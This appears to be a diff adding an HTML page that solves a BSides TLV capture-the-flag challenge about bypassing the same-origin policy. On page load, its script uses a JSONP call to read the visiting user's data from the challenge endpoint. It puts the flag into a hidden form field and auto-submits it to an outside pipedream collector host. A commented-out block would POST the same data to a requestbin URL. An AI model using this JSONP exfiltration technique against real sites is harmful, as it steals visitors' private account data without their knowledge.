@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>repl.it</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <script src="https://code.jquery.com/jquery-1.8.2.min.js"></script>
+  </head>
+  <body>
+    <form action="https://enc516ajow45h.x.pipedream.net/" method="GET" >
+    <input type="hidden" name="data" value="template" id="input" />
+    <script>
+      $(document).ready(function(){
+        $.ajax({
+                dataType: 'jsonp',
+                jsonp: 'callback',
+                url: 'https://can-you-bypass-the-sop.ctf.bsidestlv.com/FetchUserInfo?callback=?',
+                success: function (data) {
+                    /*let http = new XMLHttpRequest()
+                    http.open('POST', 'https://requestbin.net/r/w4xs0xw4', true);
+                    http.setRequestHeader('Content-type', 'application/json');
+                    http.send(JSON.stringify(data));*/
+                    var input = document.getElementById("input");
+                    console.log(data);
+                    input.value = data.flag;
+                    document.forms[0].submit();
+                }
+            });
+      });
+    </script>
+  </body>
+</html>
